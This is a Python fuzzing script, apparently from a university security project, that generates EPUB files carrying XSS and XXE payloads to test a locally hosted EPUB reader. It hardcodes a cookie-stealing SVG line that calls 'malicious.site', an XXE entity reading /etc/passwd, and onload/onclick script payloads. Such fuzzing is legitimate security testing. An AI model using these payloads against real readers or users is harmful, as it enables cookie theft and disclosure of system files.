import os
import shutil
import zipfile
from pathlib import Path
from datetime import datetime
from playwright.sync_api import sync_playwright

# 配置路径
# PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\epub_web_fuzz\XSS Injection\Intruders\xss_payloads_quick.txt"
# PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XSS Injection\Intruders\JHADDIX_XSS.txt"
# PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XXE Injection\Intruders\XXE_Fuzzing.txt"
PAYLOADS_FILE = r"C:\Users\Ruizhe\Desktop\Study\LanguageBasedSecurity\Project\PayloadsAllTheThings\XSS Injection\Intruders\JHADDIX_XSS.txt"

BASE_DIR = r".\epub_gen_data"
OUTPUT_DIR = r".\epub_gen_data\epub_gen"
TEMPLATE_DIR = os.path.join(BASE_DIR, "template")
CAPTURE_DIR = os.path.join(BASE_DIR, "captured_payloads")  # 保存触发alert的payload
# 修改为 examples/input.html 页面
TEST_INTERFACE_URL = "http://localhost:8080/examples/input.html"  

PayloadType = {
        "OEBPS/Text.xhtml": [
            "<!-- XSS_PAYLOAD -->",
            "<!-- SVG_IMAGE_INJECTION -->",
        ],
        "OEBPS/cover.svg": [
            "<rect ",  # SVG事件注入
            "// SVG_SCRIPT_PAYLOAD",
            "<!-- SVG_EVENT_PAYLOAD -->",
        ],
        "OEBPS/toc.xhtml": [
            "<!-- MALICIOUS_LINK -->",
            "<!-- XXE_INJECTION -->",
            "<!-- XSS_INJECTION -->",
        ],
        "OEBPS/metadata.xml": [
            "<!-- METADATA_TITLE -->",
            "<!-- XML_PI_INJECTION -->",
        ],
        "OEBPS/content.opf": [
            "<!-- TITLE_PAYLOAD -->", 
            "<!-- TITLE_PAYLOAD -->", 
        ]
}


def prepare_template():
    """创建包含所有注入点标记的EPUB模板结构"""
    os.makedirs(TEMPLATE_DIR, exist_ok=True)

    # 增强版模板文件
    epub_files = {
        "mimetype": "application/epub+zip",
        "META-INF/container.xml": '''<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>''',

        "OEBPS/content.opf": '''<?xml version="1.0"?>
<package version="3.0" xmlns="http://www.idpf.org/2007/opf" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:12345678-1234-1234-1234-123456789012</dc:identifier>
    <dc:title><!-- TITLE_PAYLOAD --></dc:title>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="nav" href="Text.xhtml" media-type="application/xhtml+xml"/>
    <item id="cover" href="cover.svg" media-type="image/svg+xml"/>
    <item id="toc" href="toc.xhtml" media-type="application/xhtml+xml"/>
    <item id="metadata" href="metadata.xml" media-type="application/xml"/>
  </manifest>
  <spine>
    <itemref idref="nav"/>
  </spine>
</package>''',

        "OEBPS/Text.xhtml": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Test Content</title>
</head>
<body>
    <!-- XSS_PAYLOAD -->
    <!-- SVG_IMAGE_INJECTION -->
</body>
</html>''',

        "OEBPS/cover.svg": '''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script type="text/ecmascript">
    <![CDATA[
      // SVG_SCRIPT_PAYLOAD
    ]]>
  </script>
  <!-- SVG_EVENT_PAYLOAD -->
  <rect x="10" y="10" width="80" height="80" fill="#369"/>
</svg>''',

        "OEBPS/toc.xhtml": '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head>
    <title>Table of Contents</title>
</head>
<body>
    <!-- XSS_INJECTION -->
    <nav epub:type="toc">
        <ol>
            <li><a href="Text.xhtml">Content</a></li>
            <!-- MALICIOUS_LINK -->
            <!-- XXE_INJECTION -->
        </ol>
    </nav>
</body>
</html>''',

        "OEBPS/metadata.xml": '''<?xml version="1.0"?>
<metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title><!-- METADATA_TITLE --></dc:title>
    <dc:description>
        <!-- METADATA_DESC -->
        <!-- XML_PI_INJECTION -->
    </dc:description>
</metadata>'''
    }

    # 创建模板文件
    for rel_path, content in epub_files.items():
        full_path = os.path.join(TEMPLATE_DIR, rel_path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(content)


def generate_malicious_epub(payload: str, index: int) -> list:
    """生成包含单个Payload的多个EPUB文件（每个注入点单独生成）"""
    generated_files = []

    # 定义所有注入点（新增SVG和XML注入点）
    injection_points = {
        "OEBPS/Text.xhtml": [
            ("<!-- XSS_PAYLOAD -->", f'{payload}'),
            ("<!-- SVG_IMAGE_INJECTION -->",
            '''<svg/onload=alert(1)>''')
        ],
        "OEBPS/cover.svg": [
            ("<rect ", f'<rect onclick="alert(\'SVG\')" '),  # SVG事件注入
            ("// SVG_SCRIPT_PAYLOAD", 
            "fetch('http://malicious.site/'+document.cookie)"),
            ("<!-- SVG_EVENT_PAYLOAD -->",
            '<rect x="0" y="0" width="100" height="100" onclick="alert(1)"/>')
        ],
        "OEBPS/toc.xhtml": [
            ("<!-- MALICIOUS_LINK -->", f'{payload}'),
            ("<!-- XXE_INJECTION -->",f'{payload}'),
            ("<!-- XSS_INJECTION -->",f'{payload}'),
        ],
        "OEBPS/metadata.xml": [
            ("<!-- METADATA_TITLE -->", f"Test Book {payload}"),
            ("<!-- XML_PI_INJECTION -->", f"{payload}")
        ],
        "OEBPS/content.opf": [
            ("<!-- TITLE_PAYLOAD -->", 
             f"Test Book <![CDATA[{payload}]]>"),
             ("<!-- TITLE_PAYLOAD -->", 
            f"Test Book <!ENTITY xxe SYSTEM 'file:///etc/passwd'>")
        ]
    }

    # 为每个注入点生成单独的文件
    for rel_path, replacements in injection_points.items():
        # 为每个替换规则创建独立实例
        for replace_index, (old_str, new_str) in enumerate(replacements):
            # 创建唯一临时目录
            temp_dir = os.path.join(OUTPUT_DIR, f"temp_{index}_{replace_index}")
            output_dir = os.path.join(OUTPUT_DIR, 
                                    rel_path.replace("/", "_"), 
                                    f"case_{index:04d}")
            os.makedirs(output_dir, exist_ok=True)
            
            # 生成唯一文件名
            output_file = os.path.join(output_dir, 
                                     f"payload_{replace_index:02d}.epub")

            try:
                # 复制原始模板
                shutil.copytree(TEMPLATE_DIR, temp_dir, dirs_exist_ok=True)

                # 修改目标文件
                target_file = os.path.join(temp_dir, rel_path)
                if os.path.exists(target_file):
                    with open(target_file, "r+", encoding="utf-8") as f:
                        content = f.read().replace(old_str, new_str)
                        f.seek(0)
                        f.write(content)
                        f.truncate()

                # 打包EPUB（保持规范结构）
                with zipfile.ZipFile(output_file, "w") as zf:
                    # 先添加未压缩的mimetype
                    mimetype_path = os.path.join(temp_dir, "mimetype")
                    zf.write(mimetype_path, "mimetype", 
                            compress_type=zipfile.ZIP_STORED)

                    # 添加其他文件
                    for root, _, files in os.walk(temp_dir):
                        for file in files:
                            if file == "mimetype":
                                continue
                            full_path = os.path.join(root, file)
                            arcname = os.path.relpath(full_path, temp_dir)
                            zf.write(full_path, arcname)

                generated_files.append(output_file)
                print(f"✅ 生成成功 [{rel_path}]：{output_file}")

            except Exception as e:
                print(f"❌ 生成失败 [{rel_path}]：{str(e)}")
            finally:
                shutil.rmtree(temp_dir, ignore_errors=True)

    return generated_files



if __name__ == '__main__':
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    prepare_template()

    with open(PAYLOADS_FILE, 'r', encoding='utf-8') as f:
        payloads = [line.strip() for line in f if line.strip()]

    for idx, payload in enumerate(payloads, start=1):
        print(f"🛠 Processing payload #{idx}: {payload[:50]}...")
        epub_file = generate_malicious_epub(payload, idx)
        print(f"✅ EPUB generated: {epub_file}")
